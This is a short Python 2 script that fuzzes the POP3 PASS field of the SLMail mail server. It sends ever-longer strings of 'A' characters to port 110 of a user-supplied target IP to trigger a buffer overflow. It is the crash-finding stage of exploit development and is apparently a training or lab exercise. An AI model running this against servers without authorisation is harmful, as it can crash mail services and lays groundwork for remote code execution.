#!/usr/bin/python
# Simple Python script that will fuzz the POP3 password field to trigger a Buffer Overflow condition within SLMAIL.

#Import network socket module
import socket

# Supply IP hosting Target Mail Server:
targetIP = raw_input('Target IP to Fuzz: ')

# Initialise an array of buffers, while incrementing buffer sizes;

buffer = ['A']
counter = 100
while len(buffer) <= 30:
        buffer.append("A" * counter)
        counter += 200

# Loop function that repeatedly connects to the target POP server while,
# attempting to send varying length growing buffers to the password field per established connection.

for string in buffer:
        print "Fuzzing PASS with %s bytes" % len(string)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((targetIP, 110))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS ' + string + '\r\n')
        s.send('QUIT\r\n')
        s.close()

#EOF
